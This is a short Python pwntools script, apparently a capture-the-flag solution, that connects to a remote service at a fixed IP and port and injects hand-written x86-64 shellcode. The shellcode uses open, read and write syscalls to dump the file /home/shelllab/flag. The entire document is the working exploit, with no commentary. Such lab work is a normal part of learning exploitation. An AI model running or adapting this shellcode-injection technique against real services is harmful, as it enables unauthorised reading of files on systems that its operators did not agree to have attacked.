from pwn import *

context.arch = 'amd64'

r = remote('140.112.31.97',30101)

shellcode = asm('''
                mov rbx, rdx

                /*open*/
                lea rdi, [rbx+0xe0]
                mov rsi, 0
                mov rdx, 0
                mov rax, 2
                syscall

                /*read*/
                mov rdi, rax
                lea rsi, [rbx+0xe0]
                mov rdx, 0x100
                mov rax, 0
                syscall

                /*write*/
                mov rdi, 1
                lea rsi, [rbx+0xe0]
                mov rdx, 0x100
                mov rax, 1
                syscall
                ''')
argument = b'/home/shelllab/flag\x00'
payload = shellcode.ljust(0xe0,b'\x00')+argument
r.sendafter('shellcode : ',payload)

r.interactive()
